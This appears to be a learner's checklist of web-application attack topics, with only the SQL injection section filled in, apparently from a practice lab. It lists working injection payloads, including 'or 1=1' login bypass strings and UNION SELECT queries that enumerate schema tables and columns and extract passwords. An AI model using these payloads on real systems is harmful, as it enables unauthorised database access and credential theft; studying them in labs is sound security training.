
- [ ] SQL- Union | Blind

## Union
https://portswigger.net/web-security/sql-injection/cheat-sheet

Single & Double quotes
```
jeremy' or 1=1# 
```

at the end will use the terminator # aka pound sign or we can even use
```
jeremy' or 1=1-- -
```

Version
```
version()
```


```
jeremy' union select null,null,table_name from information_schema.tables#
```

```
jeremy' union select null,null,column_name from information_schema.columns#
```

```
jeremy' union select null,null,password from injection0x01#
```


## Blind





- [ ] XSS -DOM | Stored

- [ ] Command Injection - Blind

- [ ] Insecure File Upload - Basic | Magic Bytes

- [ ] Authentication - Brute Force | MFA

- [ ] XXE

- [ ] IDOR

